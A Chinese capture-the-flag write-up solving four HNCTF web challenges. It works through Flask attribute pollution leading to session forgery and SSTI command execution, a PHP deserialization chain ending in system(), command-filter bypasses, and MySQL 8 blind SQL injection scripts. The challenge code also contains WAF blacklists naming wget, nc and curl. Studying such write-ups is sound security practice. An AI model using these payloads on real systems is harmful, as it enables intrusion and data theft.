---
title: HNCTF复现
date: 2025-10-17 19:29:49
tags:
- python原型链污染
- ssti
- flask_session伪造
- mysql8特性table注入
category:
- 比赛复现
---

#  HNCTF复现

## 知识点

### mysql8新特性table注入

参考：https://xz.aliyun.com/news/16545

## WEB

### 奇怪的咖啡店

源码：

```
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)


def add():
    pass


@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"



def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)



app.run(host="0.0.0.0",port=5014)
```

存在 `merge` 函数

```
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

很明显是原型链污染，触发点在 `/add` 路由下

```
merge(json_data, add)
```

并且json\_data可控，可以看到在触发 `merge` 之前存在 check，但是给的源码中并没有定义 check，所以可以猜测到源码并没有给全，而且需要绕过该 check

所以我们需要得到完整的源码，在 index.html 中可以看到图片存在于 `/static/img` 中，可以利用原型链污染污染静态路由 static 

```
{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
}
```

直接污染的话会被check，unicode编码绕过一下，污染时记得修改content-type为application/json

```
{
        "__\u0067\u006c\u006f\u0062\u0061\u006c\u0073__":{
            "\u0061\u0070\u0070":{
                "_\u0073\u0074\u0061\u0074\u0069\u0063_\u0066\u006f\u006c\u0064\u0065\u0072":".\u002f"
            }
        }
}
```

然后访问 /static/app.py 即可拿到完整的源码

```
from flask import Flask, session, request, render_template_string, render_template
import json
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32).hex()

@app.route('/', methods=['GET', 'POST'])
def store():
    if not session.get('name'):
        session['name'] = ''.join("customer")
        session['permission'] = 0

    error_message = ''
    if request.method == 'POST':
        error_message = '<p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！</p>'

    products = [
        {"id": 1, "name": "美式咖啡", "price": 9.99, "image": "1.png"},
        {"id": 2, "name": "橙c美式", "price": 19.99, "image": "2.png"},
        {"id": 3, "name": "摩卡", "price": 29.99, "image": "3.png"},
        {"id": 4, "name": "卡布奇诺", "price": 19.99, "image": "4.png"},
        {"id": 5, "name": "冰拿铁", "price": 29.99, "image": "5.png"}
    ]

    return render_template('index.html',
                         error_message=error_message,
                         session=session,
                         products=products)


def add():
    pass


@app.route('/add', methods=['POST', 'GET'])
def adddd():
    if request.method == 'GET':
        return '''
            <html>
                <body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    <h2>添加商品</h2>
                    <form id="productForm">
                        <p>商品名称: <input type="text" id="name"></p>
                        <p>商品价格: <input type="text" id="price"></p>
                        <button type="button" onclick="submitForm()">添加商品</button>
                    </form>
                    <script>
                        function submitForm() {
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;

                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: nameInput
                            })
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        }
                    </script>
                </body>
            </html>
        '''
    elif request.method == 'POST':
        if request.data:
            try:
                raw_data = request.data.decode('utf-8')
                if check(raw_data):
                #检测添加的商品是否合法
                    return "该商品违规，无法上传"
                json_data = json.loads(raw_data)

                if not isinstance(json_data, dict):
                    return "添加失败1"

                merge(json_data, add)
                return "你无法添加商品哦"

            except (UnicodeDecodeError, json.JSONDecodeError):
                return "添加失败2"
            except TypeError as e:
                return f"添加失败3"
            except Exception as e:
                return f"添加失败4"
        return "添加失败5"


@app.route('/aaadminnn', methods=['GET', 'POST'])
def admin():
    if session.get('name') == "admin" and session.get('permission') != 0:
        permission = session.get('permission')
        if check1(permission):
            # 检测添加的商品是否合法
            return "非法权限"

        if request.method == 'POST':
            return '<script>alert("上传成功！");window.location.href="/aaadminnn";</script>'

        upload_form = '''
        <h2>商品管理系统</h2>
        <form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc">
            <h3>上传新商品</h3>
            <input type=file name=file required style="margin:10px"><br>
            <small>支持格式：jpg/png（最大2MB）</small><br>
            <input type=submit value="立即上传" style="margin:10px;padding:5px 20px">
        </form>
        '''

        original_template = 'Hello admin!!!Your permissions are{}'.format(permission)
        new_template = original_template + upload_form

        return render_template_string(new_template)
    else:
        return "<script>alert('You are not an admin');window.location.href='/'</script>"




def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def check(raw_data, forbidden_keywords=None):
    """
    检查原始数据中是否包含禁止的关键词
    如果包含禁止关键词返回 True，否则返回 False
    """
    # 设置默认禁止关键词
    if forbidden_keywords is None:
        forbidden_keywords = ["app", "config", "init", "globals", "flag", "SECRET", "pardir", "class", "mro", "subclasses", "builtins", "eval", "os", "open", "file", "import", "cat", "ls", "/", "base", "url", "read"]

    # 检查是否包含任何禁止关键词
    return any(keyword in raw_data for keyword in forbidden_keywords)


param_black_list = ['config', 'session', 'url', '\\', '<', '>', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f',
                    'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat',  'flag',  'set',  'self', '%', 'file',  'pop(',
                    'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ]


# 增强WAF防护
def waf_check(value):
    # 检查是否有不合法的字符
    for black in param_black_list:
        if black in value:
            return False
    return True

# 检查是否是自动化工具请求
def is_automated_request():
    user_agent = request.headers.get('User-Agent', '').lower()
    # 如果是常见的自动化工具的 User-Agent，返回 True
    automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider']
    return any(agent in user_agent for agent in automated_agents)

def check1(value):

    if is_automated_request():
        print("Automated tool detected")
        return True

    # 使用WAF机制检查请求的合法性
    if not waf_check(value):
        return True

    return False


app.run(host="0.0.0.0",port=5014)
```

  可以看到还存在 `/aaadminnn` 路由，会判断 session 中的 name 是否为 `admin`，permission 处存在 ssti。所以需要伪造session，并且密钥可以污染

```
original_template = 'Hello admin!!!Your permissions are{}'.format(permission)
        new_template = original_template + upload_form
        
        return render_template_string(new_template)
```

污染密钥：payload：

```
{
        "__\u0067\u006c\u006f\u0062\u0061\u006c\u0073__" : {
            "\u0061\u0070\u0070" : {
                "\u0063\u006f\u006e\u0066\u0069\u0067" : {
                    "\u0053ECRET_KEY" :"P"
                }
            }
        }
}
```

利用网上的脚本伪造 session

ssti 可以先在本地打通

```
python flask_session_cookie_manager3.py encode -s "P" -t "{'name': 'admin','permission':'{{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(133).__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()}}'}"
```

payload解释：

```
__import__(request.args.v1)		# 动态导入模块（通过URL参数v1指定）
.popen(request.values.v2)       # 执行系统命令（通过参数v2指定）
.read()                         # 读取命令输出
```

然后执行命令即可

```
/aaadminnn?v1=os&v2=ls
```

回显

```
Hello admin!!!Your permissions are4flloog app.py ss44sstttart.sh static templates
```

flag在4flloog中，读取文件

```
/aaadminnn?v1=os&v2=cat 4flloog
```

---

### ez_php

源码：

```
 <?php
error_reporting(0);
class GOGOGO{
    public $dengchao;
    function __destruct(){
        echo "Go Go Go~ 出发喽！" . $this->dengchao;
    }
}
class DouBao{
    public $dao;
    public $Dagongren;
    public $Bagongren;
    function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
}
class HeiCaFei{
    public $HongCaFei;
    function __call($name, $arguments){
        call_user_func_array($this->HongCaFei, [0 => $name]);
    }
}

if (isset($_POST['data'])) {
    $temp = unserialize($_POST['data']);
    throw new Exception('What do you want to do?');
} else {
    highlight_file(__FILE__);
}
?> 
```

反序列化链：

```
数组反序列化 
→ GOGOGO::__destruct() 
→ DouBao::__toString() 
→ call_user_func_array([$c1, 'test']) 
→ HeiCaFei::__call('test') 
→ call_user_func_array([$c2, "cat\${IFS}/of*"]) 
→ HeiCaFei::__call('cat${IFS}/of*') 
→ call_user_func_array("system") 
→ system('cat${IFS}/of*')
```

利用 `GOGOGO` 下的 `\_\_destruct` 触发 `DouBao` 下的 `\_\_toString`，接着触发 `HeiCaFei` 下的 `\_\_call`

利用 Error 类或者数组来绕过 md5 和 sha1

还有个 `throw new Exception('What do you want to do?');` 会导致 `\_\_destruct` 无法触发

利用 GC 垃圾回收机制绕过

```
<?php
error_reporting(0);
class GOGOGO{
    public $dengchao;
    function __destruct(){
        echo "Go Go Go~ 出发喽！" . $this->dengchao;
    }
}
class DouBao{
    public $dao;
    public $Dagongren;
    public $Bagongren;
    function __toString(){
        if( ($this->Dagongren != $this->Bagongren) && (md5($this->Dagongren) === md5($this->Bagongren)) && (sha1($this->Dagongren)=== sha1($this->Bagongren)) ){
            echo "success";
            call_user_func_array($this->dao, ['诗人我吃！']);
        }
    }
}
class HeiCaFei{
    public $HongCaFei;
    function __call($name, $arguments){
        call_user_func_array($this->HongCaFei, [0 => $name]);
    }
}



$a = new GOGOGO();
$b = new DouBao();
$test1 = new Error("payload", 1);$test2 = new Error("payload", 2);
$c1 = new HeiCaFei();
$c2 = new HeiCaFei();
$c2->HongCaFei = "system";
$c1->HongCaFei = [$c2, "cat\${IFS}/of*"];
$b->dao = [$c1, 'test'];
$b->Dagongren = $test1;
$b->Bagongren = $test2;
$a->dengchao = $b;
$pop = array($a, 0);
$pop = str_replace("i:1;i:0;", "i:0;i:0;",serialize($pop));
echo urlencode($pop);
?>
```

解释一下这里的call\_user\_func\_array调用

第一步：`$c1->test('诗人我吃！')`

```
// 触发 c1 的 __call
HeiCaFei::__call('test', ['诗人我吃！'])
```

第二步：执行回调

```
→ call_user_func_array([$c2, "cat\${IFS}/of*"], [0 => 'test'])
// 相当于：
$c2->{"cat\${IFS}/of*"}('test')
```

第三步：触发 c2 的 __call

```
// 因为 "cat\${IFS}/of*" 方法不存在
HeiCaFei::__call('cat${IFS}/of*', ['test'])
→ call_user_func_array("system", [0 => 'cat${IFS}/of*'])
```

第四步：最终执行

```
// 相当于：
system('cat${IFS}/of*')
```

---

### Really_Ez_Rce

源码：

```
<?php
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
error_reporting(0);

if (isset($_REQUEST['Number'])) {
    $inputNumber = $_REQUEST['Number'];
    
    if (preg_match('/\d/', $inputNumber)) {
        die("不行不行,不能这样");
    }

    if (intval($inputNumber)) {
        echo "OK,接下来你知道该怎么做吗";
        
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            
            if (!preg_match(
                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',
                $cmd
            )) {
                echo "你传的参数似乎挺正经的,放你过去吧<br>";
                system($cmd);
            } else {
                echo "nonono,hacker!!!";
            }
        }
    }
}
```

Number 用数组绕过，传入

```
?Number[]=1
```

然后看到命令执行处过滤了很多，这里使用拼接绕过

```
POST

cmd=a=l;b=s;$a$b /
# 执行ls /
```

回显

```
bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

发现flag.txt
但是这里的点被过滤了，并且无法使用通配符?和*

 尝试使用ls -a命令得到点，然后使用拼接绕过得到flag

```
cmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g$h -a | $i$j -n 1);$a$b /$c$d$k$e$f
#最终执行的命令如下:
#cat /flag(ls -a | head -n 1)txt
```

---

### 半成品 login

首先是一个登录框。

弱密码登录

```
admin
admin123
```

然后可以看到留言提示是要去登录到 `hacker\*\*\*\*\*` 获取 flag。但是用户名和密码都未知，并且注册和忘记密码都未开放。

尝试在登录框进行sql注入，password 处存在 sql注入但是存在过滤。

过滤了单引号，使用url双编码绕过；过滤了 `or` 用 `||` 绕过；过滤了空格 用/**/绕过

```
username=admin&password=1%2527||1=1#
```

成功登录

然后用 `order by` 判断列数

```
username=admin&password=1%2527order/**/by/**/4#
username=admin&password=1%2527order/**/by/**/5#
```

判断出为4列。`select` 被过滤

这里要用 mysql8 的特性注入。

确认 mysql 版本:

```
username=admin&password=1%2527||@@version/**/LIKE/**/%2527%8.%%2527#
#1'||@@version/**/LIKE/**/'%8.%'
```

使用 mysql8 新特性的 table 注入，但由于 table 注入需要知道表名，可以利用一些系统表或系统视图来获取表名。根据登陆成功和登录失败的返回可以编写布尔盲注脚本

```
import requests
import time

url = "http://124.71.84.202:10071/login.php"

flagstr = "0123456789:;<=>?@_`abcdefghijklmnopqrstuvwxyz{|}~"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

tempstr = ""
flag = ""
for i in range(1,15):
    for idx in range(len(flagstr)):  # 使用索引遍历
        x = flagstr[idx]  # 获取当前字符
        prefix = tempstr + x
        payload1 = "1%27/**/||(%27{}%27,%271%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#".format(tempstr+x)
        #获得数据库名:hnctfweb
        payload2 = "1%27/**/||(%27hnctfweb%27,%27{}%27,%2711%27,%2711%27)<(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#".format(tempstr+x)
        #获得表名:hnctfuser
        payload3 = "1%27/**/||(%27{}%27,%27%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#".format(tempstr + x)
        #获得第一列id值:1
        payload4 = "1%27/**/||(%271%27,%27{}%27,%271%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#".format(tempstr+x)
        #获得第二列username值:admin
        payload5 = "1%27/**/||(%271%27,%27admin%27,%27{}%27,%2711%27)<(table/**/hnctfuser/**/limit/**/1)#".format(tempstr + x)
        #获得第三列password值:admin123
        payload6 = "1%27/**/||(%271%27,%27admin%27,%27admin123%27,%27{}%27)<(table/**/hnctfuser/**/limit/**/1)#".format(tempstr + x)
        #获得第四列值:noflaginhere

        payload7 = "1%27/**/||(%27{}%27,%271%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#".format(tempstr + x)
        #获得id值:2
        payload8 = "1%27/**/||(%272%27,%27{}%27,%271%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#".format(tempstr + x)
        #获得需要的关键用户名:hacker*****
        payload9 = "1%27/**/||(%272%27,%27hackerohtii%27,%27{}%27,%271%27)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#".format(tempstr + x)


        data = {
        "username":"admin",
        "password":payload8
}
        res = requests.post(url=url,data=data,allow_redirects=False,headers=headers)
        #print(payload)
        if "登陆成功" in res.text:
            continue
        elif "错误" in res.text:
            current_char = flagstr[idx - 1]
            if current_char == '~':
                print("遇到 ~，提前终止,请确认数据是否正确。")
                break
            tempstr += current_char
            flag = tempstr
            print(f"当前结果: {flag}")
            break
print(f"最终结果: {flag}")
```

这里使用了 MySQL 的性能视图 `sys.schema_tables_with_full_table_scans`。正常情况下，只有当某些 SQL 被实际执行过之后，`Performance Schema` 才会将相关信息汇总到该视图中

因此，为了模拟 “黑客已攻击完成” 的状态，在构建 Docker 镜像时，提前在登录后访问后台时执行了一条不会产生回显的 SQL（对黑客攻击未加索引的表进行查询），模拟黑客的访问行为。

然而，由于 `Performance Schema` 的机制限制，这些数据并不会立即出现在视图中，需要系统真正运行一次查询流程后才会被汇总。因此，**需要先访问一次登录后的后台页面**，以触发 `Performance Schema` 的数据刷新机制，之后才能在 `sys.schema_tables_with_full_table_scans` 中看到黑客留下的痕迹。

这里的关键用户名的 `hacker\*\*\*\*\*` 后五位是随机生成的，需要注出来

然后输入 `hacker\*\*\*\*\*` 账号密码登录即可获得 flag

二分法:

```
import requests
import string

# 扩展字符集（包含大写字母）
dicts = string.digits + string.ascii_letters + '~'

# 转换头部为字典格式
headers_str = '''Referer: http://27.25.151.198:43272/
Cookie: PHPSESSID=b6e68871b8b2319810380bce1558b4b0
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Origin: http://27.25.151.198:43272/
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'''

headers_dict = {}
for line in headers_str.split('\n'):
    if ': ' in line:
        key, value = line.split(': ', 1)
        headers_dict[key] = value

url = 'http://27.25.151.198:36643/login.php'


# 优化后的爆破函数
def blind_injection():
    payload = ''

    while True:
        last_true_char = None
        found_next_char = False
        tilde_found = False  # 标记是否遇到了波浪符

        for char in dicts:
            test_str = payload + char
            post_data = f'username=admin&password=1%2527||((%25272%2527,%2527hackerojwrx%2527,%2527{test_str}%2527,%25271%2527)<(table/**/hnctfuser/**/limit/**/1/**/offset/**/1))#'

            response = requests.post(
                url=url,
                data=post_data,
                headers=headers_dict,
                allow_redirects=False
            )

            # 打印当前测试的payload
            print(f"Testing: {test_str} -> Status: {response.status_code}")

            if '登录成功' in response.text:
                # 记录最后成立的字符
                last_true_char = char
                print(f"Condition TRUE for: {test_str}")

                # 如果遇到波浪符，终止整个爆破过程
                if char == '~':
                    print("遇到 ~，终止整个爆破过程")
                    # 不添加波浪符到payload
                    # 直接返回当前结果
                    print(f"最终结果: {payload}")
                    return payload
            else:
                # 当遇到第一个不成立的字符时
                print(f"Condition FALSE for: {test_str}")

                # 处理数字边界
                if last_true_char and last_true_char in string.digits and char in string.digits:
                    if int(last_true_char) + 1 == int(char):
                        payload += last_true_char
                        print(f"Digit boundary found: {payload}")
                        found_next_char = True
                        break

                # 处理非数字或数字边界后仍有字符的情况
                if last_true_char:
                    payload += last_true_char
                    print(f"Character found: {last_true_char} -> Payload: {payload}")
                    found_next_char = True
                    break

                # 处理开头就不成立的情况
                if not payload and not last_true_char:
                    print("No characters match, stopping.")
                    return None

        # 处理遍历完字符集但未找到边界的情况
        if not found_next_char:
            if last_true_char:
                payload += last_true_char
                print(f"Last character in set: {last_true_char} -> Payload: {payload}")
            else:
                print(f"No further characters found. Final payload: {payload}")
                return payload

    return payload


# 执行爆破
print("Starting blind SQL injection...")
result = blind_injection()
print(f"爆破结果: {result}")
```

























